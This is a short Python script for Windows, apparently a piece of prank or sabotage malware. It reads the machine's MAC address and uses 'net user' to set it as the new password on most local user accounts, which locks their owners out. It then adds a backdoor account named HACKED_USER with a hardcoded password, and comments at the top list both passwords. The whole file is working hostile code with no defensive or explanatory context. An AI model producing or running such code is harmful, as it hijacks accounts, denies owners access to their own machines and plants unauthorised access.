# password = A0-D3-C1-CB-37-86
# password = 16119192515184
import subprocess
import os

list_of_users = os.listdir("C://Users")
del list_of_users[:5]

a = subprocess.getoutput("getmac")
password = a.split("\n")[3][:17]

subprocess.call("color 02", shell=True)

for users in list_of_users:
    command = "net user " + users + " " + password
    subprocess.call(command, shell=True)

subprocess.call("net user HACKED_USER 16119192515184 /add", shell=True)
